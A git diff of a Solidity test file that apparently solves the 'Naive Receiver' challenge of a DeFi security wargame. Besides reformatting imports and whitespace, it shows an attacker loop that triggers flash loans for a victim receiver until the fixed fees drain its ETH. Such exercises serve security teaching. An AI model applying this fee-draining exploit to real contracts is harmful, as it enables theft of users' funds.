@@ -1,14 +1,13 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.10;
 
-import "../../naive-receiver/NaiveReceiverLenderPool.sol";
-import "../../naive-receiver/FlashLoanReceiver.sol";
+import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
+import "../../src/naive-receiver/FlashLoanReceiver.sol";
 
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
 contract NaiveReceiverTest is BaseTest {
-
     // Pool has 1000 ETH in balance
     uint ETHER_IN_POOL = 1000 ether;
 
@@ -42,16 +41,13 @@ contract NaiveReceiverTest is BaseTest {
         assertEq(address(pool).balance, ETHER_IN_POOL);
         assertEq(pool.fixedFee(), 1 ether);
 
-        
         receiver = new FlashLoanReceiver(payable(pool));
         (sent, ) = address(receiver).call{value: ETHER_IN_RECEIVER}("");
         require(sent, "ETHER_IN_RECEIVER not sent to receiver");
 
-
         assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
@@ -61,12 +57,12 @@ contract NaiveReceiverTest is BaseTest {
 
         vm.startPrank(attacker);
         uint256 flashFee = pool.fixedFee();
-        while( true ) {
+        while (true) {
             uint256 flashAmount = address(receiver).balance - flashFee;
             pool.flashLoan(address(receiver), flashAmount);
 
             // we have consumed all the ETH from the poor receiver :(
-            if( address(receiver).balance == 0 ) break;
+            if (address(receiver).balance == 0) break;
         }
         vm.stopPrank();
     }
